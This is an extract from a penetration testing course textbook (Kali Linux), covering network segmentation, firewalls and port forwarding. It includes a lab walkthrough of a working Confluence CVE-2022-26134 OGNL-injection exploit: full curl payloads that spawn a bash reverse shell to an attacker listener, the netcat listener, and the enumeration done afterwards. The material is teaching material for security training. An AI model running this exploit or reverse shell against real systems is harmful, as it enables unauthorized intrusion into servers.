As part of the network segmentation process, most network administrators will also implement
controls that limit the flow of traffic into, out from, and across their networks. To enforce this,
they will deploy various technologies throughout the network.
One of the most common technologies used for this are Firewalls.877 Firewalls can be
implemented at the endpoint software level. For example, the Linux kernel has firewall capabilities
that can be configured with the iptables878 tool suite, while Windows offers the built-in Windows
Defender Firewall.879 Firewalls may also be implemented as features within a piece of physical
874 (Wikipedia, 2022), https://en.wikipedia.org/wiki/Flat_network
875 (Wikipedia, 2022), https://en.wikipedia.org/wiki/Network_segmentation
876 (Wikipedia, 2022), https://en.wikipedia.org/wiki/Subnetwork
877 (Wikipedia, 2022), https://en.wikipedia.org/wiki/Firewall_(computing)
878 (Wikipedia, 2022), https://en.wikipedia.org/wiki/Iptables
879 (Microsoft, 2022), https://learn.microsoft.com/en-us/windows/security/threat-protection/windows-firewall/windows-firewall-with-
advanced-security
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 563
Made in Morocco
Penetration Testing with Kali Linux
network infrastructure. Administrators may even place a standalone hardware firewall in the
network, filtering all traffic.
Firewalls can drop unwanted inbound packets and prevent potentially-malicious traffic from
traversing or leaving the network. Firewalls may prevent all but a few allowed hosts from
communicating with a port on a particularly privileged server. They can also block some hosts or
subnets from accessing the wider internet.
Most firewalls tend to allow or block traffic in line with a set of rules based on IP addresses and
port numbers, so their functionality is limited. However, sometimes more fine-grained control is
required. Deep Packet Inspection880 monitors the contents of incoming and outgoing traffic and
terminates it based on a set of rules.
Boundaries that are put in place by network administrators are designed to prevent the arbitrary
movement of data into, out of, and across the network. But, as an attacker, these are exactly the
y
boundaries we need to traverse. We’ll need to develop strategies that can help us work around
network restrictions as we find them.
k
Port redirection (a term we are using to describe various types of port forwarding881) and
tunneling882 are both strategies we can use to traverse tshese boundaries. Port redirection means
modifying the flow of data so that packets sent to one socket will be taken and passed to another
socket. Tunneling means encapsulating883 one type of data stream within another, for example,
o
transporting Hypertext Transfer Protocol (HTTP) traffic within a Secure Shell (SSH) connection (so
from an external perspective, only the SSH traffic will be visible).
n
In this Module, we will introduce port redirection and tunneling techniques through practical
examples. We’ll ease in by starting with the lowest-complexity techniques, and increase
complexity as we move step-by-steip towards more hardened network environments. Each new
technique will be applied to a znew network configuration that is slightly different than the
previous. The only tunneling we cover in this particular Module is SSH tunneling, but we will cover
more advanced methods inD a later Module.
The logical topologies884 we create while chaining these strategies may be difficult to digest at
first. We will be making traffic move in ways that may not be initially intuitive. We should take the
time to fully understand each technique before advancing to the next. By the end of this Module,
we’ll have all the tools required to manipulate the flow of traffic in any given network with surgical
precision.
18.2 Port Forwarding with Linux Tools
This Learning Unit covers the following Learning Objectives:
1. Understand what port forwarding is
2. Learn when to use port forwarding techniques
880 (Wikipedia, 2022), https://en.wikipedia.org/wiki/Deep_packet_inspection
881 (Wikipedia, 2019), https://en.wikipedia.org/wiki/Port_forwarding
882 (Wikipedia, 2019), https://en.wikipedia.org/wiki/Tunneling_protocol
883 (Wikipedia, 2022), https://en.wikipedia.org/wiki/Encapsulation_(networking)
884 (Wikipedia, 2022), https://en.wikipedia.org/wiki/Network_topology
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 564
Made in Morocco
Penetration Testing with Kali Linux
3. Use Socat to set up a port forward in Linux
Port forwarding is the most fundamental technique we will examine in this Module. It’s also a
technique that’s very commonly used in general-purpose networking. When port forwarding, we
configure a host to listen on one port and relay all packets received on that port to another
destination.
In normal network conditions, a network administrator might create a port forward to allow
access to a web server behind a firewall. In that case, they would configure the firewall to listen
on a given port on one interface, and pass all packets to the web server behind it.
Many home routers also provide port forwarding functionality. These can be configured to listen
on a port on the Internet-facing side of the router, then forward connections from that port to
another device within the home network.
y
But how might we use port forwarding as part of an attack chain? In the next section, we’ll
consider a simple scenario.
k
18.2.1 A Simple Port Forwarding Scenario
s
Let’s examine a port forwarding scenario. During an assessment, we find a Linux web server
running a version of Confluence885 vulnerable to CVE-2022-26134:886 a pre-authentication remote
o
code execution issue. We can exploit this vulnerability and gain a reverse shell from the server.
During our enumeration, we find that this server has two network interfaces: one attached to the
n
same network our Kali machine is also on (which allowed us to route to it directly), and another
on an internal subnet. In the Confluence configuration file, we also find credentials and the IP
address and port for a PostgreSQL8 i87 database instance on a server in that internal subnet. We
want to use these credentials to gzain access to the database and enumerate further.
The diagram below shows the network layout, as we understand it so far.
D
885 (Atlassian, 2022). https://www.atlassian.com/software/confluence
886 (Atlassian, 2022), https://confluence.atlassian.com/doc/confluence-security-advisory-2022-06-02-1130377146.html
887 (PostgreSQL, 2022), https://www.postgresql.org/
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 565
Made in Morocco
Penetration Testing with Kali Linux
Figure 242: The network layout from our perspective so far
One of the first things to notice about this diagram is that there are two named networks: the
Wide Area Network (WAN)888 on the left and the Demilitarized Zone (DMZ)889 on the right. Our Kali
machine is in the WAN, the PostgreSQL database server PGDATABASE01 is in the DMZ, and the
Confluence server CONFLUENCE01 straddles both.
A WAN is a network that is large and expansive. Some people refer to the public internet as the
largest WAN in the world, and some larger organizations will refer to their large internal network
as a WAN, or internal WAN. In this case, since we’re simulating an attack from an external
network, the WAN represents a large corporate internal network, or the internet itself.
Throughout the exercises in this Module, our Kali machine will be situated in the
WAN. We will only be able to route directly from our Kali macyhine to hosts that
are also on the WAN.
k
A DMZ is a network containing devices that may be more exposed to a wider, less trusted
s
network. A DMZ helps create a buffer zone between hosts on the wider, less trusted network and
internal hosts. In this way, it serves a similar function to a real-world Demilitarized zone.890 In this
o
scenario, the DMZ is the buffer network segment between the WAN and whatever other internal
networks we may find.
n
CONFLUENCE01 is straddling both the WAN and DMZ to illustrate that it is able to communicate
on both networks. CONFLUENCE01 is also listening on TCP port 8090, illustrated by the “open
socket” attached to the icon. i
z
PGDATABASE01 is within the DMZ network boundary - it does not straddle the WAN/DMZ. Our
Kali machine is not in the DMZ, so we can’t directly route to PGDATABASE01. PGDATABASE01
D
also has an “open socket” attached to it, illustrating that there’s something listening on TCP port
5432 (this is likely a PostgreSQL server, since the default port is 5432).
Since the only thing we know about PGDATABASE01 so far is that it exists, we
don’t yet know if it’s attached to any other networks. If later we find that
PGDATABASE01 is attached to other networks, we will expand our network
diagram.
With the credentials we found on CONFLUENCE01, we want to try to connect to this PostgreSQL
port on PGDATABASE01 from our Kali machine.
Before getting into more detail, let’s set up our lab environment to recreate the scenario we’ve
described so far.
888 (Wikipedia, 2022), https://en.wikipedia.org/wiki/Wide_area_network
889 (Wikipedia, 2022), https://en.wikipedia.org/wiki/DMZ_(computing)
890 (Wikipedia, 2022), https://en.wikipedia.org/wiki/Demilitarized_zone
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 566
Made in Morocco
Penetration Testing with Kali Linux
At the end of the Port Forwarding with Socat section of this Learning Unit, a
group of VMs are provided that can be used to follow along with the following
sections. These VMs are provided so you can gain hands-on experience with all
the techniques we cover. You can start the VM group at any point and follow
along at whatever pace feels comfortable.
18.2.2 Setting Up the Lab Environment
To gain access to CONFLUENCE01, we need to leverage the command execution vulnerability in
the Confluence web application to get a reverse shell. After discovering that the Confluence web
application is vulnerable to CVE-2022-26134, we’ll find a blog post from Rapid7891 that includes a
cURL892 command containing a proof-of-concept893 payload that claims to exploit the vulnerability
y
and return a reverse shell.
curl -v k
http://10.0.0.28:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByNa
me%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash
s
%27%2C%27-c%27%2C%27bash%20-
i%20%3E%26%20/dev/tcp/10.0.0.28/1270%200%3E%261%27%29.start%28%29%22%29%7D/
Listing 518 - The example payloaod from the Rapid7 blog post.
We don’t run payloads without understanding exactly what they do, so we first need to figure out
what’s happening in this proof-of-concept. n
The verbose (-v) curl request is being made to http://10.0.0.28:8090, which we assume is the
blogpost author’s vulnerable Conflueince server. After this, the URL path894 looks more interesting.
We observe that a lot of the charazcters in it are URL encoded,895 so we need to URL decode them
to get a clearer sense of what the payload actually does.
D
You can quickly URL decode strings by selecting Decode As… > URL in the
Decoder tab in Burp,896 or using an online tool such as CyberChef.897 If working
with sensitive information in a real corporate environment, you should avoid
pasting data into online tools. However, in this case we’re decoding a proof-of-
concept that’s already public, so we can use online tools if necessary.
After URL decoding the path, the function of the payload is clearer.
891 (Rapid7, 2022), https://www.rapid7.com/blog/post/2022/06/02/active-exploitation-of-confluence-cve-2022-26134/
892 (cURL, 2022), https://curl.se/
893 (Wikipedia, 2022), https://en.wikipedia.org/wiki/Proof_of_concept
894 (Wikipedia, 2022), https://en.wikipedia.org/wiki/Uniform_Resource_Identifier#Syntax
895 (Wikipedia, 2022), https://en.wikipedia.org/wiki/Percent-encoding
896 (PortSwigger, 2022), https://portswigger.net/burp
897 (GCHQ, 2022), https://gchq.github.io/CyberChef/
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 567
Made in Morocco
Penetration Testing with Kali Linux
/${new javax.script.ScriptEngineManager().getEngineByName("nashorn").eval("new
java.lang.ProcessBuilder().command('bash','-c','bash -i >& /dev/tcp/10.0.0.28/1270
0>&1').start()")}/
Listing 519 - The example payload URL-decoded.
The URL path is an OGNL injection payload. OGNL is Object-Graph Notation Language,898 an
expression language commonly used in Java applications. OGNL injection can take place when
an application handles user input in such a way that it gets passed to the OGNL expression
parser. Since it’s possible to execute Java code within OGNL expressions, OGNL injection can be
used to execute arbitrary code.
The OGNL injection payload itself uses Java’s ProcessBuilder899 class to spawn a Bash interactive
reverse shell (bash -i).
This proof-of-concept payload is almost perfect for our needs. However, we need to modify it
y
before we can use it. This is for two reasons. First, the Confluence server that the payload is
pointing to in the original payload is not where our vulnerable Confluence server is. Second, the
Bash reverse shell payload is pointing at port 1270 on 10.0k.0.28, which is not where our Kali
machine is. We need to modify these parameters in the payload before we can reuse it to exploit
CONFLUENCE01 and return a shell to our own Kali machsine.
While making these modifications, we also need to take the URL encoding into account. The
payload string in the proof-of-concept isn’t comploetely URL encoded. Certain characters (notably
“.”, “-” and “/”) are not encoded. Although it’s not always the case, for this particular exploit, this
turns out to be important to the functioning of the payload. If any of these characters are
n
encoded, the server will parse the URL differently, and the payload may not execute. This means
we can’t apply URL encoding across the whole payload once we’ve modified it.
i
Keeping this in mind, we’ll manually modify the parameters we need, using the original proof-of-
z
concept payload as our base. We can change the Confluence server IP to 192.168.50.63, and the
Bash interactive shell payload IP and port to a listener we’re going to open on our Kali machine
D
(/dev/tcp/192.168.118.4/4444). We’ll also remove the curl verbosity flag. This leaves us with the
following modified payload:
curl
http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngine
ByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27
bash%27%2C%27-c%27%2C%27bash%20-
i%20%3E%26%20/dev/tcp/192.168.118.4/4444%200%3E%261%27%29.start%28%29%22%29%7D/
Listing 520 - The modified payload.
Now that our payload is customized for our use, we can start a Netcat900 listener on our Kali
machine on TCP port 4444.
kali@kali:~$ nc -nvlp 4444
listening on [any] 4444 ...
Listing 521 - Starting Netcat listener on port 4444 on our Kali machine.
898 (Wikipedia, 2022), https://en.wikipedia.org/wiki/OGNL
899 (Oracle, 2022), https://docs.oracle.com/javase/7/docs/api/java/lang/ProcessBuilder.html
900 (Wikipedia, 2022), https://en.wikipedia.org/wiki/Netcat
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 568
Made in Morocco
Penetration Testing with Kali Linux
With our listener running, we’ll open another shell on our Kali machine, then run the curl command
we just constructed.
kali@kali:~$ curl
http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngine
ByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27
bash%27%2C%27-c%27%2C%27bash%20-
i%20%3E%26%20/dev/tcp/192.168.118.4/4444%200%3E%261%27%29.start%28%29%22%29%7D/
kali@kali:~$
Listing 522 - Executing the modified reverse shell payload.
The command itself doesn’t return anything, but the reverse shell is caught by our listener.
...
listening on [any] 4444 ... y
connect to [192.168.118.4] from (UNKNOWN) [192.168.50.63] 55876
bash: cannot set terminal process group (813): Inappropriate ioctl for device
k
bash: no job control in this shell
confluence@confluence01:/opt/atlassian/confluence/bin$ id
id
s
uid=1001(confluence) gid=1001(confluence) groups=1001(confluence)
Listing 523 - Bash reverse shell caught by our Netcat listener, and confirmed with the id command.
o
The id command confirms that this shell is running with the privileges of the confluence user. This
user has quite limited privileges. Regardless, we now have a reverse shell from CONFLUENCE01
to our Kali machine. n
We can now start some light enumeration of CONFLUENCE01 using our new shell. We’ll check
i
the network interfaces using ip addr.
z
confluence@confluence01:/opt/atlassian/confluence/bin$ ip addr
ip addr D
1: lo:  mtu 65536 qdisc noqueue state UNKNOWN group default qlen
1000
link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
inet 127.0.0.1/8 scope host lo
valid_lft forever preferred_lft forever
inet6 ::1/128 scope host
valid_lft forever preferred_lft forever
2: ens192:  mtu 1500 qdisc fq_codel state UP group
default qlen 1000
link/ether 00:50:56:8a:54:46 brd ff:ff:ff:ff:ff:ff
inet 192.168.50.63/24 brd 192.168.50.255 scope global ens192
valid_lft forever preferred_lft forever
inet6 fe80::250:56ff:fe8a:5446/64 scope link
valid_lft forever preferred_lft forever
3: ens224:  mtu 1500 qdisc fq_codel state UP group
default qlen 1000
link/ether 00:50:56:8a:c2:c9 brd ff:ff:ff:ff:ff:ff
inet 10.4.50.63/24 brd 10.4.50.255 scope global ens224
valid_lft forever preferred_lft forever
inet6 fe80::250:56ff:fe8a:c2c9/64 scope link
valid_lft forever preferred_lft forever
Listing 524 - Enumerating network interfaces on CONFLUENCE01.
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 569
Made in Morocco
Penetration Testing with Kali Linux
The output shows us that CONFLUENCE01 has two network interfaces: ens192 and ens224.
ens192 has the IP address 192.168.50.63, and ens224 has the IP address 10.4.50.63. We can
then check the routes using ip route.
confluence@confluence01:/opt/atlassian/confluence/bin$ ip route
ip route
default via 192.168.50.254 dev ens192 proto static
10.4.50.0/24 dev ens224 proto kernel scope link src 10.4.50.63
10.4.50.0/24 via 10.4.50.254 dev ens224 proto static